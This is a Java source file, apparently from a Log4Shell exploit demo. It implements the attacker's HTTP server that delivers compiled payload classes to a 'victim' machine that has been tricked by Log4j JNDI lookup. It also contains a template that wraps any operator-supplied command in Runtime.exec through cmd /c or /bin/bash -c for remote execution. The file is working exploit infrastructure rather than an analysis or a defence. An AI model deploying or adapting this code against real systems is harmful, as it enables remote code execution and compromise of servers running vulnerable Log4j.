package com.demo.exploit.log4jshell.attacker.server.http;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;

import java.io.*;
import java.util.Objects;

/**
 * This class will handle all the HTTP requests.
 * It will send the attackers payload to Victims computer
 *
 * @author karanratra on 12/20/21
 */
public class AttackerHttpFileHandler implements HttpHandler {
    public AttackerHttpFileHandler() {
    }
    public static byte[] byteCode = null;


    private  static byte[] serialize(Object ref) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(ref);
        return out.toByteArray();
    }

    public static String getInsertCode(String command){
        String source = "";

        String cmd = "";

        if (command.startsWith("code:")) {
            String codefile = command.substring(5);
            try
            {
                File file = new File(codefile);
                if (file.exists())
                {
                    FileReader reader = new FileReader(file);
                    BufferedReader br = new BufferedReader(reader);
                    StringBuffer sb = new StringBuffer("");
                    String line = "";
                    while ((line = br.readLine()) != null)
                    {
                        sb.append(line);
                        sb.append("\r\n");
                    }
                    cmd = sb.toString();
                }
                else
                {
                    System.err.println(String.format("[-] %s is not exists!", new Object[] { codefile }));
                    System.exit(0);
                }
                source = cmd;
            }
            catch (IOException e) {
                e.printStackTrace();
            }
        }
        else if(command.startsWith("cmd:")){
            cmd = command.substring(4).replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"");
            String tpl = "try {\n" +
                    "            String cmd = \"" + cmd + "\";\n" +
                    "            String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"win\")\n" +
                    "                    ? new String[]{\"cmd\", \"/c\", cmd}\n" +
                    "                    : new String[]{\"/bin/bash\", \"-c\", cmd};\n" +
                    "            java.lang.Process pc = Runtime.getRuntime().exec(cmds);\n" +
                    "            pc.waitFor();\n" +
                    "        }catch (Exception e){\n" +
                    "            e.printStackTrace();\n" +
                    "        }";

            source = tpl;
        }

        return source;
    }

    @Override
    public void handle(HttpExchange exchange) throws IOException {
        String payloadPath = "/com/demo/exploit/log4jshell/";
        System.out.println();
        System.out.println();
        System.out.println("Request: " + exchange.getRequestURI() + " " + exchange.getRequestMethod());
        System.out.println("Address: " + exchange.getRemoteAddress());
        System.out.println("User-Agent: " + exchange.getRequestHeaders().getFirst("User-Agent"));
        byte[] response = "Hello World".getBytes();

        if (exchange.getRequestURI().getPath().startsWith(payloadPath)) {
            System.out.println("Send the serialized payload back to the Victims computer");
            response = getPayload(exchange.getRequestURI().getPath());
        }


        exchange.sendResponseHeaders(200, response.length);
        exchange.getResponseBody().write(response);
        exchange.close();
    }

    public static byte[] getPayload(String payload) {
        String address = "localhost";
        int port = 80;
        String defaultPayload = "com.demo.exploit.log4jshell.attacker.payload.Exploit";

        payload = payload.endsWith(".class") ? payload.substring(0, payload.length() - 6) : payload;
        payload = payload.replace('.', '/');
        payload = payload.endsWith(".class") ? payload : payload + ".class";
        payload = payload.startsWith("/") ? payload : '/' + payload;
        try {
            byte [] byteArray = new byte[5000];

            Objects.requireNonNull(AttackerHttpFileHandler.class.getResourceAsStream(payload)).read(byteArray);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            InputStream in = AttackerHttpFileHandler.class.getResourceAsStream(payload);
            byte[] buffer = new byte[4096];
            for (;;) {
                int nread = in.read(buffer);
                if (nread <= 0) {
                    break;
                }
                baos.write(buffer, 0, nread);
            }
            byte[] data = baos.toByteArray();
            return data;
            //return byteArray;
        } catch (Exception e) {
            if (payload.equals(defaultPayload)) {
                throw new RuntimeException("Could not find default payload: " + payload);//really
            }
            System.err.println("Could not find payload to send: '" + payload + "', Trying to use default: " + defaultPayload);
            return getPayload(defaultPayload);
        }
    }
}